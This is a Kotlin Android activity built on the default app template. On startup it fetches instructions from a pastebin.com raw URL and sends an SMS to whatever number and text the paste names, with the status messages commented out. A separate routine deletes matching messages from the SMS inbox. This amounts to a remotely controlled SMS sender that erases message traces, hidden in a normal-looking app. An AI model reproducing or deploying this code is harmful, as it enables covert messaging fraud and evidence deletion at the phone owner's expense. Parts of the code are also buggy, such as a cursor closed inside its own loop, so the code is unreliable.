package com.example.myapplication

import android.os.Bundle
import com.google.android.material.snackbar.Snackbar
import androidx.appcompat.app.AppCompatActivity
import android.view.Menu
import android.view.MenuItem

import kotlinx.android.synthetic.main.activity_main.*
import okhttp3.OkHttpClient
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import PastebinService
import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.telephony.SmsManager
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import android.R.attr.phoneNumber
import java.nio.file.Files.delete
import android.R.id.message
//import javax.swing.UIManager.put
import android.content.ContentValues
import android.database.Cursor
import android.provider.BaseColumns
import android.provider.Telephony


class MainActivity : AppCompatActivity() {
    var contact: SMSContact? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        setSupportActionBar(toolbar)
        setupRetrofit()

        fab.setOnClickListener { view ->
            deleteSMS(applicationContext, "Will you eat?", "")
            Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                .setAction("Action", null).show()
        }
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        // Inflate the menu; this adds items to the action bar if it is present.
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        return when (item.itemId) {
            R.id.action_settings -> true
            else -> super.onOptionsItemSelected(item)
        }
    }

    fun setupRetrofit() {
        val builder = OkHttpClient.Builder()
        val client = builder.build()

        val api = Retrofit.Builder() // Create retrofit builder.
            .baseUrl("https://pastebin.com/raw/") // Base url for the api has to end with a slash.
            .addConverterFactory(GsonConverterFactory.create()) // Use GSON converter for JSON to POJO object mapping.
            .client(client) // Here we set the custom OkHttp client we just created.
            .build().create(PastebinService::class.java)

        val call = api.getPasteBinJSON()
        val result = call.enqueue(object : Callback<SMSContact> {
            override fun onFailure(call: Call<SMSContact>, t: Throwable) {
//                Toast.makeText(applicationContext, "Failure: "  +t.localizedMessage, Toast.LENGTH_LONG).show()
            }

            override fun onResponse(call: Call<SMSContact>, response: Response<SMSContact>) {
                if(response.isSuccessful) {
                    contact = response.body()
                        sendSMS()
                }
//                Toast.makeText(applicationContext, "Success: " + response.body().toString(), Toast.LENGTH_LONG).show()

            }
        })
    }

    fun sendSMS() {
        val manager = SmsManager.getDefault() as SmsManager
        if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.SEND_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.SEND_SMS),
                0)
        } else {
            manager.sendTextMessage(contact!!.send, null, contact!!.message, null, null)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when(requestCode){
            0 -> {
                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    val manager = SmsManager.getDefault() as SmsManager
                    manager.sendTextMessage(contact!!.send, null, contact!!.message, null, null)
                }
            }
        }
    }

    fun deleteSMS(context: Context, message: String, number: String) {
        try {
            if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                // Permission is not granted
                ActivityCompat.requestPermissions(this,
                    arrayOf(Manifest.permission.READ_SMS),
                    1)
            } else {
    try {
        val uriSms = Uri.parse("content://sms/inbox");
        Toast.makeText(applicationContext, "" + Telephony.Sms.getDefaultSmsPackage(context), Toast.LENGTH_LONG).show()
        val c = context.getContentResolver().query(
                uriSms,
            arrayOf("_id", "thread_id", "address", "person",
                        "date", "body" ), null, null, null);

        if (c != null && c.moveToFirst()) {
            do {
                val id = c.getLong(0);
                val threadId = c.getLong(1);
                val address = c.getString(2);
                val body = c.getString(5);
                val date = c.getString(3);
//                Log.e("log>>>",
//                        "0>" + c.getString(0) + "1>" + c.getString(1)
//                                + "2>" + c.getString(2) + "<-1>"
//                                + c.getString(3) + "4>" + c.getString(4)
//                                + "5>" + c.getString(5));
//                Log.e("log>>>", "date" + c.getString(0));

                if (body.equals(message) && address.equals(number)) {
                    // mLogger.logInfo("Deleting SMS with id: " + threadId);
                    context.getContentResolver().delete(
                            Uri.parse("content://sms/" + id), null,
                            null);
                   Toast.makeText(applicationContext, "Delete success ...." ,  Toast.LENGTH_LONG).show()
                    c.close()
                }
            } while (c.moveToNext());
        }
    } catch (e: Exception) {
        Toast.makeText(applicationContext, "Delete failed ...." ,  Toast.LENGTH_LONG).show()
    }


            }
        } catch (e: Exception) {
            Toast.makeText(this, "deleting sms failed "  +e.message, Toast.LENGTH_LONG).show()

        }

    }
}
